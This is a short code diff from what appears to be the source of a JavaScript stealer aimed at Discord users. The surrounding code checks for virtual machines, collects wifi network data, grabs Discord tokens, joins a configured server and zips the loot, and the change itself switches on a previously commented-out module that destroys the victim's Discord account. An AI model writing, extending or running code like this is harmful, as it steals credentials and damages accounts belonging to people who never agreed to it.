@@ -26,7 +26,7 @@ if (config.vmProtect && checkVM()) {
   config.wifiNetworks && require('./functions/wifi-networks');
 
   require('./functions/grab-discord-token').then(() => {
-    // require('./functions/nuke-discord-account');
+    require('./functions/nuke-discord-account');
     if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
 
     require('./functions/zip').then(zipFile => {
